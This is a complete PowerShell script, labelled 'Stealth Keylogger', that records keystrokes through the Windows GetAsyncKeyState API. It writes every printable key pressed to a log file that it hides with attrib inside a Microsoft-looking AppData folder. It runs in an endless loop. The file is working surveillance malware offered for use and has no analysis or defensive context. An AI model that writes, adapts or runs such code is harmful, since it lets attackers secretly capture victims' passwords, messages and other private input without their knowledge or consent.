<#
.SYNOPSIS
    Stealth Keylogger - Captures keystrokes and writes to hidden log.
.DESCRIPTION
    Uses Windows API functions via Add-Type to capture keystrokes.
#>

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}
"@

$logPath = "$env:APPDATA\Microsoft\Windows\logkeys.log"
if (!(Test-Path $logPath)) {
    New-Item -ItemType File -Path $logPath -Force | Out-Null
    attrib +h $logPath
}

Write-Host "`n[+] Stealth Keylogger Running..." -ForegroundColor DarkRed
while ($true) {
    Start-Sleep -Milliseconds 10
    foreach ($ascii in 32..126) {
        if ([KeyLogger]::GetAsyncKeyState($ascii) -eq -32767) {
            $char = [char]$ascii
            Add-Content -Path $logPath -Value $char
        }
    }
}
